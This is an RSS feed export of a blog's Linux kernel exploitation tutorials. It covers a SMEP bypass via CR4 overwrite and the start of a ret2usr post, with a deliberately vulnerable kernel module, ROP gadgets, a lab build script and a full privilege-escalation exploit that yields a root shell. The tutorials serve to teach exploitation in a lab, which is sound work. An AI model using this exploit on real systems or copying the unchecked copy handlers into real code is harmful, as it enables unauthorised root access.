<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>kernel on Anvbis</title><link>https://anvbis.github.io/tags/kernel/</link><description>Recent content in kernel on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Wed, 26 Jan 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/kernel/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel 0x02 :: Bypass SMEP with CR4 Overwrite</title><link>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</link><pubDate>Wed, 26 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-2-bypass-smep/</guid><description>Table of Contents Overview of SMEP Overwriting the Control Register A Vulnerable Kernel Module Building a ROP Chain Environment Setup Building the Exploit Overview of SMEP Supervisor mode execution protection (SMEP) is a kernel exploit mitigation feature that marks all user-space memory pages as non-executable. This means we can still read/write to user-space memory, but we are unable to execute any code stored in user-space. You can think of this as the equivalent of kernel-space DEP.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#overview-of-smep">Overview of SMEP&lt;/a>&lt;/li>
&lt;li>&lt;a href="#overwriting-the-control-register">Overwriting the Control Register&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-a-rop-chain">Building a ROP Chain&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="overview-of-smep">Overview of SMEP&lt;/h2>
&lt;p>Supervisor mode execution protection (SMEP) is a kernel exploit mitigation feature that marks all user-space memory pages as non-executable. This means we can still read/write to user-space memory, but we are unable to execute any code stored in user-space. You can think of this as the equivalent of kernel-space DEP.&lt;/p>
&lt;p>In the kernel, SMEP is enabled by setting the 20th bit of the control register, &lt;code>cr4&lt;/code>. We can potentially bypass this exploit mitigation by unsetting this bit.&lt;/p>
&lt;p>As we cannot execute code in user-space, we&amp;rsquo;ll need to find some other way to control process execution. We can do this via return-oriented programming (ROP).&lt;/p>
&lt;p>Note: Attempting to overwrite the &lt;code>cr4&lt;/code> register in newer kernel versions will cause the kernel to panic. This is as newer kernels attempt to &amp;lsquo;pin&amp;rsquo; the sensitive bits in the &lt;code>cr4&lt;/code> and &lt;code>cr0&lt;/code> registers, detecting any changes made to them as an exploit mitigation feature.&lt;/p>
&lt;h2 id="overwriting-the-control-register">Overwriting the Control Register&lt;/h2>
&lt;p>To overwrite the value of the &lt;code>cr4&lt;/code> register, we can use a kernel-space function called &lt;code>native_write_cr4&lt;/code>. We can find the address of this function by reading &lt;code>/proc/kallsyms&lt;/code>.&lt;/p>
&lt;pre>&lt;code>/ # cat /proc/kallsyms | grep native_write_cr4
ffffffff814443e0 T native_write_cr4
&lt;/code>&lt;/pre>&lt;p>Whatever value is passed into &lt;code>native_write_cr4&lt;/code> will replace the value of the &lt;code>cr4&lt;/code> register. Meaning we can modify the bit that enables SMEP protections in kernel-space.&lt;/p>
&lt;h2 id="a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/h2>
&lt;p>We can use the same vulnerable kernel module as in the return to user-space post to demonstrate this technique. This kernel module has buffer overflow vulnerabilities in both its &lt;code>challenge_read&lt;/code> and &lt;code>challenge_write&lt;/code> function handlers.&lt;/p>
&lt;p>For an overview of the vulnerabilities present in this kernel module, please read the previous post.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" checked />
&lt;label for="1">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">challenge.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;linux/kernel.h&amp;gt;
#include &amp;lt;linux/module.h&amp;gt;
#include &amp;lt;linux/fs.h&amp;gt;
#include &amp;lt;linux/proc_fs.h&amp;gt;
#include &amp;lt;linux/uaccess.h&amp;gt;
MODULE_LICENSE(&amp;#34;GPL&amp;#34;);
char out[256];
static ssize_t challenge_read(struct file *fp, char *buf, size_t len, loff_t *off)
{
char tmp[128];
return raw_copy_to_user(buf, tmp, len);
}
static ssize_t challenge_write(struct file *fp, const char *buf, size_t len, loff_t *off)
{
char tmp[128];
return raw_copy_from_user(tmp, buf, len);
}
static int challenge_open(struct inode *inode, struct file *fp)
{
return 0;
}
static int challenge_release(struct inode *inode, struct file *fp)
{
return 0;
}
static struct file_operations fops = {
.read = challenge_read,
.write = challenge_write,
.open = challenge_open,
.release = challenge_release
};
struct proc_dir_entry *proc_entry;
int init_module(void)
{
proc_entry = proc_create(&amp;#34;challenge&amp;#34;, 0666, NULL, &amp;amp;fops);
return 0;
}
void cleanup_module(void)
{
if (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;h2 id="building-a-rop-chain">Building a ROP Chain&lt;/h2>
&lt;p>The main component that we require to bypass SMEP is a gadget that modifies the value of CR4 with a value that we control. Running &lt;code>rp++&lt;/code> we find a gadget that moves the value of &lt;code>eax&lt;/code> into &lt;code>cr4&lt;/code>, this should work well for our purposes.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 3 --unique | grep 'cr4'
0xffffffff8103a411: add eax, 0x01A7F8BA ; mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret ; (1 found)
0xffffffff8103a416: mov cr4, eax ; mov byte [0xFFFFFFFF82AB9CC8], 0x00000000 ; ret ; (1 found)
...
&lt;/code>&lt;/pre>&lt;p>All we need now is a gadget that will allow us to control the value of &lt;code>eax&lt;/code>, or &lt;code>rax&lt;/code>. These are easy to find.&lt;/p>
&lt;pre>&lt;code>~/pwnkernel $ rp++ -f linux-5.0/vmlinux -r 1 --unique | grep 'pop rax ; ret'
0xffffffff8101b8d0: pop rax ; ret ; (66 found)
...
&lt;/code>&lt;/pre>&lt;p>Let&amp;rsquo;s check what the value of CR4 is prior to us modifying it. We can do this within GDB, while debugging the kernel.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; p/x $cr4
$1 = 0x1006f0
&lt;/code>&lt;/pre>&lt;p>Now we can build the SMEP bypass portion of our ROP chain. We know that we need to clear the 20th bit of CR4 to disable SMEP, meaning that we need to change its value from &lt;code>0x106f0&lt;/code> to &lt;code>0x6f0&lt;/code>.&lt;/p>
&lt;p>The ROP chain will do the following:&lt;/p>
&lt;ul>
&lt;li>Use a &lt;code>pop rax&lt;/code> instruction to move the value of &lt;code>0x6f0&lt;/code> into &lt;code>rax&lt;/code>.&lt;/li>
&lt;li>Use the &lt;code>mov cr4, eax; ...&lt;/code> gadget to overwrite CR4 with that value.&lt;/li>
&lt;li>Return to our privilege escalation function in user-space.&lt;/li>
&lt;/ul>
&lt;p>As we have bypassed SMEP, our privilege escalation function (stored in user-space) should now be executable.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">21&lt;/span>];
payload[&lt;span style="color:#ae81ff">16&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
payload[&lt;span style="color:#ae81ff">17&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8101b8d0&lt;/span>; &lt;span style="color:#75715e">// pop rax ; ret
&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">18&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x6f0&lt;/span>; &lt;span style="color:#75715e">// rax = 0x6f0
&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">19&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8103a416&lt;/span>; &lt;span style="color:#75715e">// mov cr4, eax ; ... ; ret
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
payload[&lt;span style="color:#ae81ff">20&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">21&lt;/span>);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;p>As noted previously, newer versions of the linux kernel will &amp;lsquo;pin&amp;rsquo; certain bits of the CR4 register, meaning that if we attempt to modify it the kernel will crash. For the purposes of this demonstration we&amp;rsquo;ll be using an earlier kernel version.&lt;/p>
&lt;p>All we need to do is modify our &lt;code>build.sh&lt;/code> and &lt;code>launch.sh&lt;/code> scripts to use an earlier kernel version (in this case linux kernel version 5.0).&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash -e
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
export KERNEL_VERSION&lt;span style="color:#f92672">=&lt;/span>5.0
export BUSYBOX_VERSION&lt;span style="color:#f92672">=&lt;/span>1.32.0
...
&lt;/code>&lt;/pre>&lt;/div>&lt;p>You can find the whole &lt;code>build.sh&lt;/code> script in the code snippet below.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" checked />
&lt;label for="1">
&lt;span class="collapsable-code__language">sh&lt;/span>
&lt;span class="collapsable-code__title">build.sh&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-sh" >&lt;code>
#!/bin/bash -e
export KERNEL_VERSION=5.0
export BUSYBOX_VERSION=1.32.0
#
# dependencies
#
echo &amp;#34;[&amp;#43;] Checking / installing dependencies...&amp;#34;
sudo apt-get -q update
sudo apt-get -q install -y bison flex libelf-dev cpio build-essential libssl-dev qemu-system-x86
#
# linux kernel
#
echo &amp;#34;[&amp;#43;] Downloading kernel...&amp;#34;
wget -q -c https://mirrors.edge.kernel.org/pub/linux/kernel/v5.x/linux-$KERNEL_VERSION.tar.gz
[ -e linux-$KERNEL_VERSION ] || tar xzf linux-$KERNEL_VERSION.tar.gz
echo &amp;#34;[&amp;#43;] Building kernel...&amp;#34;
make -C linux-$KERNEL_VERSION defconfig
echo &amp;#34;CONFIG_NET_9P=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_NET_9P_DEBUG=n&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_9P_FS=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_9P_FS_POSIX_ACL=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_9P_FS_SECURITY=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_NET_9P_VIRTIO=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_VIRTIO_PCI=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_VIRTIO_BLK=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_VIRTIO_BLK_SCSI=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_VIRTIO_NET=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_VIRTIO_CONSOLE=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_HW_RANDOM_VIRTIO=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_DRM_VIRTIO_GPU=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_VIRTIO_PCI_LEGACY=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_VIRTIO_BALLOON=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_VIRTIO_INPUT=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_CRYPTO_DEV_VIRTIO=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_BALLOON_COMPACTION=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_PCI=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_PCI_HOST_GENERIC=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_GDB_SCRIPTS=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_DEBUG_INFO=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_DEBUG_INFO_REDUCED=n&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_DEBUG_INFO_SPLIT=n&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_DEBUG_FS=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_DEBUG_INFO_DWARF4=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_DEBUG_INFO_BTF=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
echo &amp;#34;CONFIG_FRAME_POINTER=y&amp;#34; &amp;gt;&amp;gt; linux-$KERNEL_VERSION/.config
make -C linux-$KERNEL_VERSION -j16 bzImage
#
# Busybox
#
echo &amp;#34;[&amp;#43;] Downloading busybox...&amp;#34;
wget -q -c https://busybox.net/downloads/busybox-$BUSYBOX_VERSION.tar.bz2
[ -e busybox-$BUSYBOX_VERSION ] || tar xjf busybox-$BUSYBOX_VERSION.tar.bz2
echo &amp;#34;[&amp;#43;] Building busybox...&amp;#34;
make -C busybox-$BUSYBOX_VERSION defconfig
sed -i &amp;#39;s/# CONFIG_STATIC is not set/CONFIG_STATIC=y/g&amp;#39; busybox-$BUSYBOX_VERSION/.config
make -C busybox-$BUSYBOX_VERSION -j16
make -C busybox-$BUSYBOX_VERSION install
#
# filesystem
#
echo &amp;#34;[&amp;#43;] Building filesystem...&amp;#34;
cd fs
mkdir -p bin sbin etc proc sys usr/bin usr/sbin root home/ctf
cd ..
cp -a busybox-$BUSYBOX_VERSION/_install/* fs
#
# modules
#
echo &amp;#34;[&amp;#43;] Building modules...&amp;#34;
cd src
make
cd ..
cp src/*.ko fs/
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Taking our &lt;code>launch.sh&lt;/code> script from the previous Linux kernel exploitation post (return to user-space), all we need to add is a line with the &lt;code>+smep&lt;/code> flag.&lt;/p>
&lt;p>Note that we will also need to update the path to the kernel image (as we are using Linux 5.0 instead of Linux 5.4).&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="2" type="checkbox" />
&lt;label for="2">
&lt;span class="collapsable-code__language">sh&lt;/span>
&lt;span class="collapsable-code__title">launch.sh&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-sh" >&lt;code>
#!/bin/bash
# build root fs
pushd fs
find . -print0 | cpio --null -ov --format=newc | gzip -9 &amp;gt; ../initramfs.cpio.gz
popd
# launch
/usr/bin/qemu-system-x86_64 \
-kernel linux-5.0/arch/x86/boot/bzImage \
-initrd $PWD/initramfs.cpio.gz \
-fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \
-nographic \
-monitor none \
-s \
-cpu kvm64,&amp;#43;smep \
-append &amp;#34;console=ttyS0 nokaslr nopti quiet&amp;#34;
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>We can run this script like before in order to be dropped into a root shell on our kernel emulator.&lt;/p>
&lt;h2 id="building-the-exploit">Building the Exploit&lt;/h2>
&lt;p>We can take our previous exploit from the &lt;code>ret2usr&lt;/code> article and utilise it with very little modification. All we need is our updated &lt;code>overflow_buffer&lt;/code> function. This way we can execute our ROP chain in order to return to user-space and execute arbitrary code.&lt;/p>
&lt;p>You can find the complete exploit code below.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="3" type="checkbox" checked />
&lt;label for="3">
&lt;span class="collapsable-code__language">c&lt;/span>
&lt;span class="collapsable-code__title">exploit.c&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-c" >&lt;code>
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;
#include &amp;lt;assert.h&amp;gt;
#include &amp;lt;unistd.h&amp;gt;
#include &amp;lt;fcntl.h&amp;gt;
unsigned long save_ss, save_sp, save_rf, save_cs;
void shell()
{
system(&amp;#34;/bin/sh&amp;#34;);
}
void save_user_space()
{
/* save user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;mov save_ss, ss;&amp;#34;
&amp;#34;mov save_sp, rsp;&amp;#34;
&amp;#34;pushf;&amp;#34;
&amp;#34;pop save_rf;&amp;#34;
&amp;#34;mov save_cs, cs;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
}
void load_user_space(unsigned long target)
{
/* return to user-space */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;swapgs;&amp;#34;
&amp;#34;mov r15, save_ss;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_sp;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_rf;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, save_cs;&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;mov r15, %[rip];&amp;#34;
&amp;#34;push r15;&amp;#34;
&amp;#34;iretq;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
: [rip] &amp;#34;=&amp;amp;r&amp;#34; (target)
);
}
void escalate_privileges()
{
/* escalate privileges */
__asm__(
&amp;#34;.intel_syntax noprefix;&amp;#34;
&amp;#34;xor rdi, rdi;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34; // prepare_kernel_cred
&amp;#34;call rbx;&amp;#34;
&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34; // commit_creds
&amp;#34;mov rdi, rax;&amp;#34;
&amp;#34;call rbx;&amp;#34;
&amp;#34;.att_syntax;&amp;#34;
);
/* return to user-space */
load_user_space((unsigned long)shell);
}
unsigned long leak_canary(int fd)
{
unsigned long leak[32];
read(fd, leak, sizeof(unsigned long) * 32);
return leak[16];
}
void overflow_buffer(int fd, unsigned long canary)
{
unsigned long payload[21];
payload[16] = canary;
payload[17] = 0xffffffff8101b8d0; // pop rax ; ret
payload[18] = 0x6f0; // rax = 0x6f0
payload[19] = 0xffffffff8103a416; // mov cr4, eax ; ... ; ret
payload[20] = (unsigned long)escalate_privileges;
write(fd, payload, sizeof(unsigned long) * 21);
}
int main(int argc, char **argv)
{
save_user_space();
int fd = open(&amp;#34;/proc/challenge&amp;#34;, O_RDWR);
assert(fd &amp;gt; 0);
/* leak stack canary */
unsigned long canary = leak_canary(fd);
printf(&amp;#34;[*] canary @ 0x%lx\n&amp;#34;, canary);
overflow_buffer(fd, canary);
return 0;
}
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>When we execute this exploit within our kernel emulator we can see that it bypasses SMEP, returns to user-space and gives us a root shell.&lt;/p>
&lt;pre>&lt;code>/ # insmod challenge.ko
/ # su ctf
/ $ /home/ctf/exploit
...
/ # id
uid=0(root) gid=0
&lt;/code>&lt;/pre>&lt;h2 id="appendix">Appendix&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://lkmidas.github.io/posts/20210128-linux-kernel-pwn-part-2/">Learning Linux Kernel Exploitation - Part 2&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://archive.org/details/youtube-g55Cq4WWykI">Hacking RootKit Development 16 - Bypass Linux Kernel 3.15 x86 CR4 &amp;amp; CR0 pinning protections&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Linux Kernel 0x01 :: Return to User-space</title><link>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</link><pubDate>Tue, 25 Jan 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/linux-kernel-1-ret2usr/</guid><description>Table of Contents User-space vs. Kernel-space Return to User-space Overview Saving the Initial State Restoring the Initial State Escalating Privileges in the Kernel A Vulnerable Kernel Module Exploiting the Kernel Module Environment Setup Building the Exploit User-space vs. Kernel-space Kernel-space is where the kernel runs and provides its services (i.e. where kernel code and kerenl modules run), whereas user-space is where user processes are executed. User-space code runs in it&amp;rsquo;s own carefully segregated piece of memory, where kernel-space code has access to the entirety of system memory.</description><content>&lt;h2 id="table-of-contents">Table of Contents&lt;/h2>
&lt;ol>
&lt;li>&lt;a href="#user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/a>&lt;/li>
&lt;li>&lt;a href="#return-to-user-space-overview">Return to User-space Overview&lt;/a>&lt;/li>
&lt;li>&lt;a href="#saving-the-initial-state">Saving the Initial State&lt;/a>&lt;/li>
&lt;li>&lt;a href="#restoring-the-initial-state">Restoring the Initial State&lt;/a>&lt;/li>
&lt;li>&lt;a href="#escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/a>&lt;/li>
&lt;li>&lt;a href="#a-vulnerable-kernel-module">A Vulnerable Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#exploiting-the-kernel-module">Exploiting the Kernel Module&lt;/a>&lt;/li>
&lt;li>&lt;a href="#environment-setup">Environment Setup&lt;/a>&lt;/li>
&lt;li>&lt;a href="#building-the-exploit">Building the Exploit&lt;/a>&lt;/li>
&lt;/ol>
&lt;h2 id="user-space-vs-kernel-space">User-space vs. Kernel-space&lt;/h2>
&lt;p>Kernel-space is where the kernel runs and provides its services (i.e. where kernel code and kerenl modules run), whereas user-space is where user processes are executed. User-space code runs in it&amp;rsquo;s own carefully segregated piece of memory, where kernel-space code has access to the entirety of system memory.&lt;/p>
&lt;p>Within kernel-space all physical memory is available (to some degree, depending on which kernel exploit mitigations are enabled). What this means, is that we are able to read and potentially execute code loaded in user-space.&lt;/p>
&lt;p>It is important to note, however, that most kernel exploit mitigations attempt to separate user-space from kernel-space, preventing us from executing any code loaded in user-space.&lt;/p>
&lt;h2 id="return-to-user-space-overview">Return to User-space Overview&lt;/h2>
&lt;p>The &lt;code>ret2usr&lt;/code> exploit technique is very straight-forward. When all kernel exploit mitigations are disabled, you are able to execute user-space code inside kernel-space. This means we can write code that escalates our privileges and returns from kernel-space in order to execute arbitrary code, with the end goal of spawning a root shell.&lt;/p>
&lt;p>As a result, all we need to do within our exploit is redirect process execution to user-space code that escalates privileges, returns to user-space and pops a shell.&lt;/p>
&lt;h2 id="saving-the-initial-state">Saving the Initial State&lt;/h2>
&lt;p>Before we can begin exploitation we will need to find some way to save the current user-space state. This is done as the &lt;code>iretq&lt;/code> instruction will use the information saved below in order to return to user-space.&lt;/p>
&lt;p>We save the required registers with the assembly code below in order to build our &lt;code>iret&lt;/code> frame to later exit kernel-space.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> save_ss, save_sp, save_rf, save_cs;
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">save_user_space&lt;/span>()
{
&lt;span style="color:#75715e">/* save user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_ss, ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_sp, rsp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pushf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pop save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_cs, cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="restoring-the-initial-state">Restoring the Initial State&lt;/h2>
&lt;p>In order to restore the initial state and return to user-space we require two instructions, &lt;code>swapgs&lt;/code> and &lt;code>iretq&lt;/code>. In x86_64 systems the &lt;code>swapgs&lt;/code> instruction must be made before the &lt;code>iretq&lt;/code> instruction as it swaps the &lt;code>gs&lt;/code> register between kernel-mode and user-mode.&lt;/p>
&lt;p>We next build our &lt;code>iret&lt;/code> frame, containing the information required to return to user-space by pushing our saved user-space registers onto the top of the stack. Finally we make our &lt;code>iretq&lt;/code> instruction to return from kernel-space.&lt;/p>
&lt;p>Note: At the very top of our &lt;code>iret&lt;/code> frame we put the address we want to return to.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">load_user_space&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> target)
{
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;swapgs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_sp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, %[rip];&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;iretq;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">:&lt;/span> [rip] &lt;span style="color:#e6db74">&amp;#34;=&amp;amp;r&amp;#34;&lt;/span> (target)
);
}
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="escalating-privileges-in-the-kernel">Escalating Privileges in the Kernel&lt;/h2>
&lt;p>Escalating privileges inside kernel-space is done via two function calls, &lt;code>prepare_kernel_cred&lt;/code> and &lt;code>commit_creds&lt;/code>.&lt;/p>
&lt;p>The &lt;code>prepare_kernel_cred&lt;/code> function call creates a credentials struct for whatever uid is provided to it (this will almost always be &amp;lsquo;0&amp;rsquo;, for the root user). The &lt;code>commit_creds&lt;/code> function call takes whatever credentials struct is provided to it and applies those privileges to the current user.&lt;/p>
&lt;p>We can find the address (in kernel-space) of both these functions by reading the &lt;code>/proc/kallsyms&lt;/code> file.&lt;/p>
&lt;pre>&lt;code>/ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff810881c0 T prepare_kernel_cred
/ # cat /proc/kallsyms | grep commit_creds
ffffffff81087e80 T commit_creds
